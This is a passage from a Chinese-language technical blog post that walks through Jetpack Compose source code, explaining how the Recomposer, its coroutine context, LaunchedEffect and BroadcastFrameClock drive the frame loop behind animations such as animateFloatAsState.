<pre><code class="hljs language-rust" lang="rust"><span class="hljs-comment">// Recomposer 主循环</span>
parentFrameClock.withFrameNanos { frameTime <span class="hljs-punctuation">-&gt;</span>
    <span class="hljs-comment">// 执行重组工作</span>
}
</code></pre>
<ol>
<li><code>PausableMonotonicFrameClock.withFrameNanos()</code> 被调用</li>
<li>调用 <code>latch.await()</code></li>
<li>由于 <code>latch.isOpen = true</code>，立即返回</li>
<li>委托给 <code>frameClock.withFrameNanos()</code>（即 <code>AndroidUiDispatcher</code>）</li>
<li>获取帧时间，执行重组</li>
</ol>
<p><strong>步骤 2：暂停</strong></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 某个条件触发暂停</span>
pausableClock<span class="hljs-selector-class">.pause</span>()  <span class="hljs-comment">// 调用 latch.closeLatch()</span>
</code></pre>
<ol>
<li>
<p><code>latch._isOpen</code> 被设为 <code>false</code></p>
</li>
<li>
<p>下一次 <code>withFrameNanos()</code> 调用时：</p>
<ul>
<li><code>latch.await()</code> 检查到 <code>isOpen = false</code></li>
<li>协程挂起，<code>Continuation</code> 加入 <code>awaiters</code> 列表</li>
<li><strong>帧循环暂停，不再消耗 CPU</strong></li>
</ul>
</li>
</ol>
<p><strong>步骤 3：恢复</strong>
在activity恢复的时候，调用<code>latch.openLatch()</code></p>
<pre><code class="hljs language-scss" lang="scss"><span class="hljs-comment">// 在activity恢复的时候触发</span>
pausableClock<span class="hljs-selector-class">.resume</span>()  <span class="hljs-comment">// 调用 latch.openLatch()</span>
</code></pre>
<ol>
<li><code>latch._isOpen</code> 被设为 <code>true</code></li>
<li>遍历 <code>awaiters</code> 列表，调用每个 <code>Continuation.resume(Unit)</code></li>
<li>挂起的协程恢复执行</li>
<li>继续调用 <code>frameClock.withFrameNanos()</code></li>
<li><strong>帧循环恢复</strong></li>
</ol>
<h2 data-id="heading-19">三、Recomposer与effectCoroutineContext</h2>
<p><code>Recomposer</code> 是 Compose 的核心调度器，负责管理所有 Composition 的重组和帧循环。</p>
<h3 data-id="heading-20">3、1 Recomposer 在哪里创建？</h3>
<p><code>Recomposer</code> 在 <code>ComponentActivity.setContent</code> 内部通过 <code>WindowRecomposer</code> 工厂方法创建。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// WindowRecomposer.android.kt</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> View.<span class="hljs-title">createLifecycleAwareWindowRecomposer</span><span class="hljs-params">(
    coroutineContext: <span class="hljs-type">CoroutineContext</span> = EmptyCoroutineContext,
    lifecycle: <span class="hljs-type">Lifecycle</span>? = <span class="hljs-literal">null</span>,
)</span></span>: Recomposer {
    <span class="hljs-comment">// 获取主线程 Dispatcher，也就是AndroidUiDispatcher.Main</span>
    <span class="hljs-comment">// baseContext包含了AndroidUiDispatcher和AndroidUiFrameClock</span>
    <span class="hljs-keyword">val</span> baseContext =
        <span class="hljs-keyword">if</span> (
            coroutineContext[ContinuationInterceptor] == <span class="hljs-literal">null</span> ||
                coroutineContext[MonotonicFrameClock] == <span class="hljs-literal">null</span>
        ) {
            AndroidUiDispatcher.CurrentThread + coroutineContext
        } <span class="hljs-keyword">else</span> coroutineContext
    <span class="hljs-comment">// 获取动画时钟 (PausableMonotonicFrameClock)</span>
    <span class="hljs-comment">// 它包装了基于 Choreographer 的 AndroidUiFrameClock，支持暂停</span>
    <span class="hljs-keyword">val</span> pausableClock =
        baseContext[MonotonicFrameClock]?.let { PausableMonotonicFrameClock(it).apply { pause() } }

    <span class="hljs-comment">// MotionDurationScale：控制动画速度，需要支持"开发者选项"中的"动画时长缩放"设置。这是通过 `MotionDurationScale` 接口实现的。</span>
    <span class="hljs-keyword">var</span> systemDurationScaleSettingConsumer: MotionDurationScaleImpl? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">val</span> motionDurationScale =
        baseContext[MotionDurationScale]
            ?: MotionDurationScaleImpl().also { systemDurationScaleSettingConsumer = it }

    <span class="hljs-comment">// baseContext为AndroidUiDispatcher和AndroidUiFrameClock</span>
    <span class="hljs-comment">// PausableMonotonicFrameClock和AndroidUiFrameClock都实现了MonotonicFrameClock</span>
    <span class="hljs-comment">// baseContext + pausableClock，PausableMonotonicFrameClock在右边</span>
    <span class="hljs-comment">// PausableMonotonicFrameClock会覆盖AndroidUiFrameClock</span>
    <span class="hljs-comment">// 最终contextWithClockAndMotionScale包含了AndroidUiDispatcher、PausableMonotonicFrameClock和MotionDurationScale</span>
    <span class="hljs-keyword">val</span> contextWithClockAndMotionScale =
        baseContext + (pausableClock ?: EmptyCoroutineContext) + motionDurationScale
    <span class="hljs-comment">// 创建Recomposer对象</span>
    <span class="hljs-keyword">val</span> recomposer =
        Recomposer(contextWithClockAndMotionScale).also { it.pauseCompositionFrameClock() }
    <span class="hljs-comment">// 创建协程作用域，上下文包含了AndroidUiDispatcher、PausableMonotonicFrameClock和MotionDurationScale    </span>
    <span class="hljs-keyword">val</span> runRecomposeScope = CoroutineScope(contextWithClockAndMotionScale)
    <span class="hljs-keyword">val</span> viewTreeLifecycle =
        checkPreconditionNotNull(lifecycle ?: findViewTreeLifecycleOwner()?.lifecycle) {
            <span class="hljs-string">"ViewTreeLifecycleOwner not found from <span class="hljs-variable">$this</span>"</span>
        }
    <span class="hljs-comment">// 使用LifeCycle监听activity生命周期    </span>
    viewTreeLifecycle.addObserver(
        <span class="hljs-keyword">object</span> : LifecycleEventObserver {
            <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onStateChanged</span><span class="hljs-params">(source: <span class="hljs-type">LifecycleOwner</span>, event: <span class="hljs-type">Lifecycle</span>.<span class="hljs-type">Event</span>)</span></span> {
                <span class="hljs-keyword">val</span> self = <span class="hljs-keyword">this</span>
                <span class="hljs-keyword">when</span> (event) {
                    Lifecycle.Event.ON_CREATE -&gt; {
                        <span class="hljs-comment">// 在Activity的onCreate中启动协程</span>
                        runRecomposeScope.launch(start = CoroutineStart.UNDISPATCHED) {
                            <span class="hljs-keyword">var</span> durationScaleJob: Job? = <span class="hljs-literal">null</span>
                            <span class="hljs-keyword">try</span> {
                                durationScaleJob =
                                    systemDurationScaleSettingConsumer?.let {
                                        <span class="hljs-keyword">val</span> durationScaleStateFlow =
                                            getAnimationScaleFlowFor(context.applicationContext)
                                        it.scaleFactor = durationScaleStateFlow.value
                                        launch {
                                            durationScaleStateFlow.collect { scaleFactor -&gt;
                                                it.scaleFactor = scaleFactor
                                            }
                                        }
                                    }
                                <span class="hljs-comment">// 在协程中开启帧循环    </span>
                                recomposer.runRecomposeAndApplyChanges()
                            } <span class="hljs-keyword">finally</span> {
                                durationScaleJob?.cancel()
                                <span class="hljs-comment">// If runRecomposeAndApplyChanges returns or this coroutine is</span>
                                <span class="hljs-comment">// cancelled it means we no longer care about this lifecycle.</span>
                                <span class="hljs-comment">// Clean up the dangling references tied to this observer.</span>
                                source.lifecycle.removeObserver(self)
                            }
                        }
                    }
                    Lifecycle.Event.ON_START -&gt; {
                        <span class="hljs-comment">// 恢复时钟</span>
                        pausableClock?.resume()

                        <span class="hljs-comment">// Resumes the frame clock dispatching If this is an ON_START after an</span>
                        <span class="hljs-comment">// ON_STOP that paused it. If the recomposer is not paused  calling</span>
                        <span class="hljs-comment">// `resumeFrameClock()` is ignored.</span>
                        recomposer.resumeCompositionFrameClock()
                    }
                    Lifecycle.Event.ON_STOP -&gt; {
                        <span class="hljs-comment">// Pause the recomposer's frame clock which will pause all calls to</span>
                        <span class="hljs-comment">// `withFrameNanos` (e.g. animations) while the window is stopped.                </span>
                        <span class="hljs-comment">// 暂停重组器的帧时钟，这将暂停所有调用withFrameNanos方法的对象</span>
                        recomposer.pauseCompositionFrameClock()
                    }
                    Lifecycle.Event.ON_DESTROY -&gt; {
                        recomposer.cancel()
                    }
                    Lifecycle.Event.ON_PAUSE -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                    Lifecycle.Event.ON_RESUME -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                    Lifecycle.Event.ON_ANY -&gt; {
                        <span class="hljs-comment">// Nothing</span>
                    }
                }
            }
        }
    )
    <span class="hljs-keyword">return</span> recomposer
}
</code></pre>
<p>加上了注释，理解起来应当不难。需要注意的是协程上下文，代码中的<code>contextWithClockAndMotionScale</code>包含了<code>AndroidUiDispatcher</code>、<code>PausableMonotonicFrameClock</code>和<code>MotionDurationScale</code>。如果你没理解，估计是没看懂协程上下文的 <strong><code>+</code>操作符</strong>，可以查看<a href="https://juejin.cn/post/7600291308409716790" target="_blank" title="https://juejin.cn/post/7600291308409716790">Compose原理六之Kotlin协程上下文</a>。</p>
<p>创建完Recomposer对象后，使用LifeCycle监听activity生命周期，在Activity的onCreate中启动协程，在协程中调用<code>runRecomposeAndApplyChanges</code>，开启帧循环。</p>
<h3 data-id="heading-21">3、2 Recomposer的协程上下文包含哪些内容</h3>
<p><code>effectCoroutineContext</code>就是上小节中的<code>contextWithClockAndMotionScale</code>。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Recomposer.kt 源码分析</span>

<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Recomposer</span>(effectCoroutineContext: CoroutineContext) : CompositionContext() {

    
    <span class="hljs-comment">/**
     * Recomposer 内部创建的 Job，作为所有副作用协程的父 Job
     *
     */</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> effectJob = Job(effectCoroutineContext[Job])
    
    <span class="hljs-comment">// 创建 BroadcastFrameClock</span>
    <span class="hljs-comment">// 这是一个特殊的 MonotonicFrameClock 实现，它不仅能提供帧时间，</span>
    <span class="hljs-comment">// 还能被"驱动"（通过 sendFrame 方法）</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> broadcastFrameClock = BroadcastFrameClock {
        <span class="hljs-comment">// onNewAwaiters 回调：当有协程调用 withFrameNanos 挂起等待时触发</span>
        synchronized(stateLock) {
            <span class="hljs-comment">// 这是一个唤醒机制：</span>
            <span class="hljs-comment">// 当有新的动画等待帧时，需要唤醒 Recomposer 的主循环</span>
            deriveStateLocked().also {
                <span class="hljs-comment">// 如果 Recomposer 处于等待状态，唤醒它</span>
                <span class="hljs-keyword">if</span> (_state.value &lt;= State.ShuttingDown)
                    workContinuation?.resume(<span class="hljs-built_in">Unit</span>)
            }
        }
    }
    

<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> effectCoroutineContext: CoroutineContext =
    effectCoroutineContext + broadcastFrameClock + effectJob  
</code></pre>
<p><code>effectCoroutineContext</code>成了<code>effectCoroutineContext + broadcastFrameClock + effectJob</code>，<code>BroadcastFrameClock</code>实现了<code>MonotonicFrameClock</code>，又在<code>+</code>操作符的右边，<code>BroadcastFrameClock</code>覆盖掉了<code>PausableMonotonicFrameClock</code>。最终<code>effectCoroutineContext</code>包含了<code>AndroidUiDispatcher</code>、<code>BroadcastFrameClock</code>、<code>effectJob</code>和<code>MotionDurationScale</code>。</p>
<h3 data-id="heading-22">3、3 Composer获取协程上下文</h3>
<p><code>Recomposer</code> 继承自<code>CompositionContext</code>。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// CompositionContext.kt</span>
<span class="hljs-keyword">abstract</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">CompositionContext</span> {
    <span class="hljs-keyword">abstract</span> <span class="hljs-keyword">val</span> effectCoroutineContext: CoroutineContext
}
</code></pre>
<p>当我们在 <code>setContent</code> 中创建 <code>Composition</code> 时，会传入 <code>Recomposer</code> 作为父上下文。<code>Composer</code> 通过 <code>parentContext</code> 获取它。<code>parentContext</code>就是<code>Recomposer</code> </p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Composer.kt</span>
<span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> applyCoroutineContext: CoroutineContext =
    <span class="hljs-comment">// 获取 Recomposer 的 effectCoroutineContext</span>
    parentContext.effectCoroutineContext +
    (errorContext ?: EmptyCoroutineContext)
</code></pre>
<p><strong><code>Composer</code>的协程上下文就是<code>Recomposer</code>的<code>effectCoroutineContext</code>，<code>Composer</code>和<code>Recomposer</code>的协程上下文是同一个。</strong></p>
<h3 data-id="heading-23">3、4 LaunchedEffect 如何使用上下文</h3>
<h4 data-id="heading-24">3、4、1 LaunchedEffect 的源码分析</h4>
<pre><code class="hljs language-less" lang="less"><span class="hljs-comment">// Effects.kt</span>
<span class="hljs-variable">@Composable</span>
<span class="hljs-variable">@NonRestartableComposable</span>
<span class="hljs-variable">@OptIn</span>(<span class="hljs-attribute">InternalComposeApi</span>::class)
public fun <span class="hljs-built_in">LaunchedEffect</span>(<span class="hljs-attribute">key1</span>: Any?, <span class="hljs-attribute">block</span>: suspend CoroutineScope.() -&gt; Unit) {
    <span class="hljs-comment">// 第一步：获取当前 Composer 的 applyCoroutineContext</span>
    <span class="hljs-comment">// 这个上下文包含了从 Recomposer 继承下来的 BroadcastFrameClock</span>
    <span class="hljs-selector-tag">val</span> <span class="hljs-selector-tag">applyContext</span> = <span class="hljs-selector-tag">currentComposer</span><span class="hljs-selector-class">.applyCoroutineContext</span>
    
    <span class="hljs-comment">// 第二步：使用 remember 创建并保存 LaunchedEffectImpl</span>
    <span class="hljs-comment">// 当 key1 变化时，旧的 LaunchedEffectImpl 会被 forgotten（协程取消）</span>
    <span class="hljs-comment">// 新的 LaunchedEffectImpl 会被 remembered（协程启动）</span>
    <span class="hljs-selector-tag">remember</span>(key1) { <span class="hljs-selector-tag">LaunchedEffectImpl</span>(applyContext, block) }
}
</code></pre>
<h4 data-id="heading-25">3、4、2 LaunchedEffectImpl的源码分析</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Effects.kt</span>
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">LaunchedEffectImpl</span>(
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> parentCoroutineContext: CoroutineContext,  <span class="hljs-comment">// ← 从 Composer 获取的上下文</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> task: <span class="hljs-keyword">suspend</span> CoroutineScope.() -&gt; <span class="hljs-built_in">Unit</span>,
) : RememberObserver, CoroutineExceptionHandler {
    
    <span class="hljs-comment">// 创建协程作用域</span>
    <span class="hljs-comment">// 这个 scope 的上下文包含了 BroadcastFrameClock</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(
        parentCoroutineContext +  <span class="hljs-comment">// ← 包含 BroadcastFrameClock</span>
            <span class="hljs-keyword">if</span> (parentCoroutineContext[CompositionErrorContextImpl] != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">this</span>  <span class="hljs-comment">// 添加自己作为异常处理器</span>
            } <span class="hljs-keyword">else</span> {
                EmptyCoroutineContext
            }
    )
    
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> job: Job? = <span class="hljs-literal">null</span>

    <span class="hljs-comment">// 当 LaunchedEffectImpl 被 remember 时调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onRemembered</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 安全检查：取消可能存在的旧任务</span>
        job?.cancel(<span class="hljs-string">"Old job was still running!"</span>)
        
        <span class="hljs-comment">// 启动新协程</span>
        <span class="hljs-comment">// 这个协程继承了 scope 的上下文</span>
        <span class="hljs-comment">// 因此它可以通过 coroutineContext[MonotonicFrameClock] 获取 BroadcastFrameClock</span>
        job = scope.launch(block = task)
    }

    <span class="hljs-comment">// 当 LaunchedEffectImpl 被 forget 时调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onForgotten</span><span class="hljs-params">()</span></span> {
        <span class="hljs-comment">// 取消协程</span>
        job?.cancel(LeftCompositionCancellationException())
        job = <span class="hljs-literal">null</span>
    }

    <span class="hljs-comment">// 当组合被放弃时调用</span>
    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">onAbandoned</span><span class="hljs-params">()</span></span> {
        job?.cancel(LeftCompositionCancellationException())
        job = <span class="hljs-literal">null</span>
    }

    <span class="hljs-comment">// 异常处理</span>
    <span class="hljs-keyword">override</span> <span class="hljs-keyword">val</span> key: CoroutineContext.Key&lt;*&gt;
        <span class="hljs-keyword">get</span>() = CoroutineExceptionHandler.Key

    <span class="hljs-keyword">override</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">handleException</span><span class="hljs-params">(context: <span class="hljs-type">CoroutineContext</span>, exception: <span class="hljs-type">Throwable</span>)</span></span> {
        <span class="hljs-comment">// 处理未捕获的异常</span>
        context[CompositionErrorContextImpl]?.apply {
            exception.attachComposeStackTrace(<span class="hljs-keyword">this</span><span class="hljs-symbol">@LaunchedEffectImpl</span>)
        }
        parentCoroutineContext[CoroutineExceptionHandler]?.handleException(context, exception)
            ?: <span class="hljs-keyword">throw</span> exception
    }
}
</code></pre>
<h4 data-id="heading-26">3、4、3 LaunchedEffectImpl的协程作用域分析</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// LaunchedEffectImpl 中的 scope 的上下文结构</span>
<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> scope = CoroutineScope(parentCoroutineContext + ...)

<span class="hljs-comment">// parentCoroutineContext 来自 currentComposer.applyCoroutineContext</span>
<span class="hljs-comment">// 其包含：</span>
<span class="hljs-comment">// ┌─────────────────────────────────────┐</span>
<span class="hljs-comment">// │ ContinuationInterceptor (Dispatchers.Main) │</span>
<span class="hljs-comment">// │ MonotonicFrameClock (BroadcastFrameClock)  │  ← 关键！</span>
<span class="hljs-comment">// │ Job (来自 Recomposer.effectJob)            │</span>
<span class="hljs-comment">// │ MotionDurationScale (可选)         │</span>
<span class="hljs-comment">// └─────────────────────────────────────┘</span>
</code></pre>
<p><strong><code>LaunchedEffect</code>使用的是Composer的协程上下文，<code>Composer</code>的协程上下文是<code>Recomposer</code>的协程上下文。</strong></p>
<h3 data-id="heading-27">3、5 BroadcastFrameClock的详细工作原理</h3>
<p><code>BroadcastFrameClock</code> 是一个特殊的 <code>MonotonicFrameClock</code> 实现，它不仅能让协程等待帧，还能被外部驱动来分发帧信号。让我们深入分析它的源码。</p>
<h4 data-id="heading-28">3、5、1 BroadcastFrameClock 的核心数据结构</h4>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// BroadcastFrameClock.kt</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BroadcastFrameClock</span>(<span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> onNewAwaiters: (() -&gt; <span class="hljs-built_in">Unit</span>)? = <span class="hljs-literal">null</span>) : MonotonicFrameClock {
    
    <span class="hljs-comment">// 管理等待帧的协程</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> lock = makeSynchronizedObject()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> failureCause: Throwable? = <span class="hljs-literal">null</span>
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">val</span> pendingAwaitersCountUnlocked = AtomicAwaitersCount()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> awaiters = mutableObjectListOf&lt;FrameAwaiter&lt;*&gt;&gt;()
    <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> spareList = mutableObjectListOf&lt;FrameAwaiter&lt;*&gt;&gt;()
    
    <span class="hljs-comment">// 检查是否有等待者</span>
    <span class="hljs-keyword">public</span> <span class="hljs-keyword">val</span> hasAwaiters: <span class="hljs-built_in">Boolean</span>
        <span class="hljs-keyword">get</span>() = pendingAwaitersCountUnlocked.hasAwaiters()
}
</code></pre>
<p><strong>关键组件：</strong></p>
<ul>
<li><strong>awaiters 列表</strong>：存储所有当前正在等待帧的协程（<code>FrameAwaiter</code>）。</li>
<li><strong>AtomicAwaitersCount</strong>：原子计数器，用于高效地跟踪等待者数量，避免频繁加锁。</li>
<li><strong>onNewAwaiters 回调</strong>：当等待者数量从 0 变为 1 时触发，用于唤醒 Recomposer。</li>
</ul>
<h4 data-id="heading-29">3、5、2 withFrameNanos：协程如何等待帧</h4>
<p>当动画调用 <code>withFrameNanos</code> 时，它会挂起当前协程，并将其注册到等待列表中。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">override</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-type">&lt;R&gt;</span> <span class="hljs-title">withFrameNanos</span><span class="hljs-params">(onFrame: (<span class="hljs-type">Long</span>) -&gt; <span class="hljs-type">R</span>)</span></span>: R =
        suspendCancellableCoroutine { co -&gt;
            <span class="hljs-comment">// 1. 创建一个 FrameAwaiter，包装协程和回调</span>
            <span class="hljs-keyword">val</span> awaiter = FrameAwaiter(onFrame, co)
            <span class="hljs-keyword">var</span> hasNewAwaiters = <span class="hljs-literal">false</span>
            <span class="hljs-keyword">var</span> awaitersVersion = -<span class="hljs-number">1</span>
            
            synchronized(lock) {
                <span class="hljs-comment">// 2. 检查是否已经失败</span>
                <span class="hljs-keyword">val</span> cause = failureCause
                <span class="hljs-keyword">if</span> (cause != <span class="hljs-literal">null</span>) {
                    co.resumeWithException(cause)
                    <span class="hljs-keyword">return</span><span class="hljs-symbol">@suspendCancellableCoroutine</span>
                }
                
                <span class="hljs-comment">// 3. 增加等待者计数，并获取版本号</span>
                awaitersVersion =
                    pendingAwaitersCountUnlocked.incrementCountAndGetVersion(
                        ifFirstAwaiter = { hasNewAwaiters = <span class="hljs-literal">true</span> }  <span class="hljs-comment">// 如果是第一个等待者，标记</span>
                    )
                
                <span class="hljs-comment">// 4. 将 awaiter 加入等待列表</span>
                awaiters.add(awaiter)
            }

            <span class="hljs-comment">// 5. 设置取消回调</span>
            co.invokeOnCancellation {
                awaiter.cancel()
                pendingAwaitersCountUnlocked.decrementCount(awaitersVersion)
            }

            <span class="hljs-comment">// 6. 如果是第一个等待者，触发 onNewAwaiters 回调</span>
            <span class="hljs-comment">// 这会唤醒 Recomposer 的主循环</span>
            <span class="hljs-keyword">if</span> (hasNewAwaiters &amp;&amp; onNewAwaiters != <span class="hljs-literal">null</span>) {
                <span class="hljs-keyword">try</span> {
                    onNewAwaiters.invoke()
                } <span class="hljs-keyword">catch</span> (t: Throwable) {
                    fail(t)
                }
            }
        }
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li><strong>版本号机制</strong>：<code>awaitersVersion</code> 用于处理并发取消。如果协程在等待期间被取消，只有当版本号匹配时才会减少计数，避免误减。</li>
<li><strong>唤醒机制</strong>：<code>hasNewAwaiters</code> 标志确保只在第一个等待者加入时唤醒 Recomposer，避免重复唤醒。</li>
</ul>
<h4 data-id="heading-30">3、5、3 sendFrame：Recomposer 如何驱动帧</h4>
<p>当 <code>Recomposer</code> 从系统获取到帧信号后，它会调用 <code>sendFrame</code> 来唤醒所有等待的动画协程。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">sendFrame</span><span class="hljs-params">(timeNanos: <span class="hljs-type">Long</span>)</span></span> {
        synchronized(lock) {
            <span class="hljs-comment">// 1. 交换列表：将当前等待列表与备用列表交换</span>
            <span class="hljs-comment">// 这样可以避免在恢复协程时新协程加入导致的问题</span>
            <span class="hljs-keyword">val</span> toResume = awaiters
            awaiters = spareList
            spareList = toResume
            
            <span class="hljs-comment">// 2. 重置计数器并增加版本号</span>
            pendingAwaitersCountUnlocked.incrementVersionAndResetCount()

            <span class="hljs-comment">// 3. 恢复所有等待的协程</span>
            <span class="hljs-keyword">for</span> (i <span class="hljs-keyword">in</span> <span class="hljs-number">0</span> until toResume.size) {
                toResume[i].resume(timeNanos)
            }
            
            <span class="hljs-comment">// 4. 清空列表</span>
            toResume.clear()
        }
    }
</code></pre>
<p><strong>关键点：</strong></p>
<ul>
<li><strong>列表交换</strong>：使用双列表技术（<code>awaiters</code> 和 <code>spareList</code>）来避免并发问题。当恢复协程时，新协程可以加入新的 <code>awaiters</code> 列表，而不会干扰当前的恢复过程。</li>
<li><strong>同步恢复</strong>：所有协程都在 <code>sendFrame</code> 调用期间同步恢复，确保它们在同一帧内执行。</li>
</ul>
<h3 data-id="heading-31">3、6 Recomposer的帧循环</h3>
<p><strong>parentFrameClock为什么是PausableMonotonicFrameClock？</strong></p>
<p>首先要知道<code>runRecomposeAndApplyChanges</code>在哪个协程中执行，在3、1章节中，我们介绍了<code>contextWithClockAndMotionScale</code>，<code>contextWithClockAndMotionScale</code>包含了<code>AndroidUiDispatcher</code>、<code>PausableMonotonicFrameClock</code>和<code>MotionDurationScale</code>。接着创建了使用<code>contextWithClockAndMotionScale</code>创建了协程作用域对象，开启了协程，调用<code>runRecomposeAndApplyChanges</code>，<code>parentFrameClock</code>就是<code>PausableMonotonicFrameClock</code>了。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-comment">// Recomposer.kt</span>
<span class="hljs-keyword">public</span> <span class="hljs-keyword">suspend</span> <span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">runRecomposeAndApplyChanges</span><span class="hljs-params">()</span></span>: <span class="hljs-built_in">Unit</span> =
    recompositionRunner { parentFrameClock -&gt;
        <span class="hljs-comment">// parentFrameClock是PausableMonotonicFrameClock</span>
        
        <span class="hljs-keyword">while</span> (shouldKeepRecomposing) {
            awaitWorkAvailable()  <span class="hljs-comment">// 等待有工作需要做</span>

            <span class="hljs-comment">// 如果没有帧相关的工作，继续等待</span>
            <span class="hljs-keyword">if</span> (!recordComposerModifications()) <span class="hljs-keyword">continue</span>

            <span class="hljs-comment">// 等待下一帧：与显示刷新率对齐</span>
            parentFrameClock.withFrameNanos { frameTime -&gt;
                
                <span class="hljs-comment">// 1. 首先分发动画帧</span>
                <span class="hljs-keyword">if</span> (hasBroadcastFrameClockAwaiters) {
                    trace(<span class="hljs-string">"Recomposer:animation"</span>) {
                        <span class="hljs-comment">// 向所有动画广播帧时间</span>
                        broadcastFrameClock.sendFrame(frameTime)

                        <span class="hljs-comment">// 确保观察到所有全局状态变化</span>
                        Snapshot.sendApplyNotifications()
                    }
                }

                <span class="hljs-comment">// 2. 然后执行重组</span>
                trace(<span class="hljs-string">"Recomposer:recompose"</span>) {
                    <span class="hljs-comment">// 记录需要重组的 Composer</span>
                    recordComposerModifications()
                    synchronized(stateLock) {
                        compositionInvalidations.forEach { toRecompose += it }
                        compositionInvalidations.clear()
                    }

                    <span class="hljs-comment">// 执行重组</span>
                    <span class="hljs-keyword">while</span> (toRecompose.isNotEmpty() || toInsert.isNotEmpty()) {
                        toRecompose.fastForEach { composition -&gt;
                            performRecompose(composition, modifiedValues)?.let {
                                toApply += it
                            }
                        }
                        toRecompose.clear()
                        <span class="hljs-comment">// ... 插入移动内容等</span>
                    }

                    <span class="hljs-comment">// 3. 应用变更到 UI 树</span>
                    <span class="hljs-keyword">if</span> (toApply.isNotEmpty()) {
                        changeCount++
                        toApply.fastForEach { composition -&gt;
                            composition.applyChanges()
                        }
                        toApply.clear()
                    }
                }
            }
        }
    }
</code></pre>
<p><strong>知道了<code>MonotonicFrameClock</code>帧时钟和<code>Recomposer</code>协程上下文，接下来就来看动画的实现原理了</strong>。</p>
<h2 data-id="heading-32">四、动画原理</h2>
<h3 data-id="heading-33">4、1 来个例子</h3>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">MyButton</span><span class="hljs-params">()</span></span> {
    <span class="hljs-keyword">var</span> isPressed <span class="hljs-keyword">by</span> remember { mutableStateOf(<span class="hljs-literal">false</span>) }
    
    <span class="hljs-comment">// 当 isPressed 改变时，scale 会平滑过渡</span>
    <span class="hljs-keyword">val</span> scale <span class="hljs-keyword">by</span> animateFloatAsState(
        targetValue = <span class="hljs-keyword">if</span> (isPressed) <span class="hljs-number">1.2f</span> <span class="hljs-keyword">else</span> <span class="hljs-number">1f</span>
    )
    
    Box(
        modifier = Modifier
            .scale(scale)  <span class="hljs-comment">// 使用动画值</span>
            .clickable { isPressed = !isPressed }
    ) {
        Text(<span class="hljs-string">"点我"</span>)
    }
}
</code></pre>
<p>假设你写了这样的代码：
<strong>你可能的疑问：</strong></p>
<ol>
<li>❓ <code>animateFloatAsState</code> 返回的 <code>scale</code> 是怎么自动变化的？</li>
<li>❓ 为什么每次 <code>scale</code> 变化，UI 就会自动更新？</li>
<li>❓ 动画是怎么做到 60fps 平滑运行的？</li>
</ol>
<p>让我一步步解答这些问题。</p>
<h3 data-id="heading-34">4、2 animateFloatAsState</h3>
<p>源码简化版，保留核心逻辑。使用LaunchedEffect开启协程，如果对副作用不熟悉，可以查看<a href="https://juejin.cn/post/7599017594519322650" target="_blank" title="https://juejin.cn/post/7599017594519322650">Compose原理五之副作用</a>。</p>
<pre><code class="hljs language-kotlin" lang="kotlin"><span class="hljs-meta">@Composable</span>
<span class="hljs-function"><span class="hljs-keyword">fun</span> <span class="hljs-title">animateFloatAsState</span><span class="hljs-params">(targetValue: <span class="hljs-type">Float</span>)</span></span>: State&lt;<span class="hljs-built_in">Float</span>&gt; {
    <span class="hljs-comment">// 步骤1：创建一个"动画状态容器"（只创建一次）</span>
    <span class="hljs-keyword">val</span> animatable = remember { Animatable(initialValue = targetValue) }
    
